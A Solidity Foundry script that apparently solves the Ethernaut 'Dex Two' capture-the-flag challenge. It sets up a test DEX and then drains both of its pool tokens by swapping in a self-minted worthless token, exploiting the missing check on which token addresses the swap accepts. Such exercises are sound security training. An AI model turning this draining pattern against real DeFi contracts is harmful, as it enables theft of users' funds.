pragma solidity ^0.8.0;

import "node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Script} from "forge-std/Script.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Dex2.sol";
import {console} from "forge-std/console.sol";


contract deploy is Script
{ // same set up for testing as in Dex part 1
    function run() external
    {
        vm.startBroadcast();

        DexTwo dex = new DexTwo();
        address dexAddr = address(dex);
        console.log("initialized dex at:", dexAddr);

        address player; // address you plan to use when running EmptyDex

        SwappableTokenTwo token1 = new SwappableTokenTwo(dexAddr, "Token1", "TKN1", 110);
        SwappableTokenTwo token2 = new SwappableTokenTwo(dexAddr, "Token2", "TKN2", 110);

        address token1Addr = address(token1);
        address token2Addr = address(token2);

        dex.setTokens(token1Addr, token2Addr);

        token1.approve(dexAddr, 100);
        token2.approve(dexAddr, 100);

        dex.add_liquidity(address(token1), 100);
        dex.add_liquidity(address(token2), 100);

        console.log("dex balance tkn1:", token1.balanceOf(dexAddr));
        console.log("dex balance tkn2:", token2.balanceOf(dexAddr));

        token1.transfer(player, 10);
        token2.transfer(player, 10);

        console.log("player balance tkn1:", token1.balanceOf(player));
        console.log("player balance tkn2:", token2.balanceOf(player));

        vm.stopBroadcast();
    }
}

contract Attack is Script
{
    function run() external
    {
        vm.startBroadcast();

        address dexAddr; // instance address

        DexTwo dex = DexTwo(dexAddr);
        address token1 = dex.token1();
        address token2 = dex.token2();

        // release a new revolutionary token
        SwappableTokenTwo myToken = new SwappableTokenTwo(dexAddr, "NTKN", "niceTKN", 1000);
        address myTokenAddr = address(myToken);

        myToken.approve(dexAddr, 300);
        myToken.transfer(dexAddr, 100);

        // swap it fot the target ones
        dex.swap(myTokenAddr, token1, 100);
        dex.swap(myTokenAddr, token2, 200);

        // assure you passed ;)
        console.log("dex balance:");
        console.log("token1:", ERC20(token1).balanceOf(dexAddr));
        console.log("token2:", ERC20(token2).balanceOf(dexAddr));

        console.log("player balance:");
        console.log("token1:", ERC20(token1).balanceOf(msg.sender));
        console.log("token2:", ERC20(token2).balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}
